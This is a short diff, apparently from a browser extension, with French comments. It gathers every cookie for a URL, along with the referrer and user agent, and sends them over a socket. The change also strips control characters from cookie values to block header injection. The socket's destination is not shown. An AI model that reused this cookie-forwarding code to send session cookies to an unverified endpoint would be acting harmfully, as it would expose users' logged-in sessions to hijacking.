@@ -21,7 +21,7 @@ async function flushPending() {
       const headers = await gatherHeaders(it.url, it.referrer);
       socket.send(JSON.stringify(buildCapture(it.url, headers)));
     } catch (_e) {
-      // URL invalide : ignorée
+      // URL invalide ou erreur de collecte : on ignore cette capture
     }
   }
 }
@@ -32,13 +32,17 @@ async function gatherHeaders(url, referrer) {
   let cookie = "";
   try {
     const cookies = await chrome.cookies.getAll({ url });
-    cookie = cookies.map((c) => `${c.name}=${c.value}`).join("; ");
+    // Retirer les caractères de contrôle (ex. \r\n) des valeurs pour éviter toute
+    // corruption / injection d'en-tête Cookie ; les cookies normaux ne sont pas affectés.
+    const clean = (s) => String(s).replace(/[\x00-\x1f]/g, "");
+    cookie = cookies.map((c) => `${clean(c.name)}=${clean(c.value)}`).join("; ");
   } catch (_e) {
     // pas d'accès cookies pour cette URL : on envoie sans
   }
   return {
     referrer: referrer || undefined,
     cookie: cookie || undefined,
+    // Toujours présent (navigator.userAgent est non vide) — voulu : on veut l'UA du navigateur.
     user_agent: navigator.userAgent,
   };
 }
